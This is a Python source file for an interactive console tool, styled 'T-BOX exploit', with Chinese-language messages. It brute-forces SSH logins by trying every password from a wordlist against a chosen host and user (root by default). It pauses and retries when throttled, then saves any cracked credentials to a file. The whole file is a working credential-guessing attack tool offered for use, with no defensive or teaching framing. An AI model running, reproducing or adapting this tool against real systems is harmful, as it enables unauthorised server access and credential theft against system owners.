import socket
import paramiko
import time
def is_ssh_open(hostname,username,password):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(hostname=hostname,username=username,password=password,timeout=3)
    except socket.timeout:
        print(f'[-]无法连接主机:{hostname},连接超时!')
    except paramiko.AuthenticationException:
        print(f'[-]错误的账号密码:{username}:{password}')
    except paramiko.SSHException:
        print('[-]似乎尝试次数过多,30秒后尝试')
        time.sleep(30)
        return is_ssh_open(hostname,username,password)
    else:
        print(f'主机{hostname}破解成功 ssh账号密码:   {username}:{password}     ')
        return True

def ssh_main(hostname,username):

    password_list = open('pwd.txt').read().splitlines()
    for password in password_list:
        if is_ssh_open(hostname=hostname,username=username,password=password):
            open('ssh.txt','w').write(f'{username}@{hostname}:{password}')
            break

hostname = '0.0.0.0'
username = 'root'
while True:
    cmd = input('T-BOX exploit(password/ssh) >')
    if cmd == 'show options':
        print('                                                          ')
        print('----------name---------content------------present---------')
        print('       rhosts      '+hostname+'             目标IP              ')
        print('       username     '+username+'              目标用户名             ')
        print('----------------------------------------------------------------')

    elif cmd[:10] == 'set rhosts':
        hostname = cmd[11:]
        print('[*]rhosts ==> '+ hostname)

    elif cmd[:12] == 'set username':
        username = cmd[13:]
        print('[*]username ==> '+ username)

    elif cmd == '':
        pass
    
    elif cmd == 'back':
        break

    elif cmd == 'run':
        if hostname == '0.0.0.0':
            print('[-]请设置目标IP')
        else:
            print('[+]start.....')
            ssh_main(hostname=hostname,username=username)
    else:
        print("[-]can't find command: " + cmd)